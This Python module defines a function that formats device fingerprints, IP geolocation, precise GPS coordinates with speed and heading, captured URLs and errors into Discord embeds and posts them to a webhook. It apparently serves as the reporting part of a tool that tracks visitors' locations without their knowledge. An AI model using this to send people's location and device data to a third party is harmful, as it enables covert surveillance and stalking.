#!/usr/bin/env python3

import requests
from json import dumps, loads


def discord_sender(url, msg_type, content):
    json_str = dumps(content)
    json_content = loads(json_str)
    if msg_type == 'device_info':
        info_message = {
            "content": None,
            "embeds": [
                {
                    "title": "Device Information",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "OS",
                            "value": json_content['os']
                        },
                        {
                            "name": "Platform",
                            "value": json_content['platform']
                        },
                        {
                            "name": "Browser",
                            "value": json_content['browser']
                        },
                        {
                            "name": "GPU Vendor",
                            "value": json_content['vendor']
                        },
                        {
                            "name": "GPU",
                            "value": json_content['render']
                        },
                        {
                            "name": "CPU Cores",
                            "value": json_content['cores']
                        },
                        {
                            "name": "RAM",
                            "value": json_content['ram']
                        },
                        {
                            "name": "Public IP",
                            "value": json_content['ip']
                        },
                        {
                            "name": "Resolution",
                            "value": f'{json_content["ht"]}x{json_content["wd"]}'
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=info_message, timeout=10)

    if msg_type == 'ip_info':
        ip_info_msg = {
            "content": None,
            "embeds": [
                {
                    "title": "IP Information",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "Continent",
                            "value": json_content['continent']
                        },
                        {
                            "name": "Country",
                            "value": json_content['country']
                        },
                        {
                            "name": "Region",
                            "value": json_content['region']
                        },
                        {
                            "name": "City",
                            "value": json_content['city']
                        },
                        {
                            "name": "Org",
                            "value": json_content['org']
                        },
                        {
                            "name": "ISP",
                            "value": json_content['isp']
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=ip_info_msg, timeout=10)

    if msg_type == 'location':
        location_msg = {
            "content": None,
            "embeds": [
                {
                    "title": "Location Information",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "Latitude",
                            "value": json_content['lat']
                        },
                        {
                            "name": "Longitude",
                            "value": json_content['lon']
                        },
                        {
                            "name": "Accuracy",
                            "value": json_content['acc']
                        },
                        {
                            "name": "Altitude",
                            "value": json_content['alt']
                        },
                        {
                            "name": "Direction",
                            "value": json_content['dir']
                        },
                        {
                            "name": "Speed",
                            "value": json_content['spd']
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=location_msg, timeout=10)

    if msg_type == 'url':
        url_msg = {
            "content": json_content['url'],
            "embeds": None,
            "attachments": []
        }
        requests.post(url, json=url_msg, timeout=10)

    if msg_type == 'error':
        error_msg = {
            "content": None,
            "embeds": [
                {
                    "color": 16711680,
                    "fields": [
                        {
                            "name": "Error",
                            "value": json_content['error']
                        }
                    ]
                }
            ],
            "attachments": []
        }
        requests.post(url, json=error_msg, timeout=10)
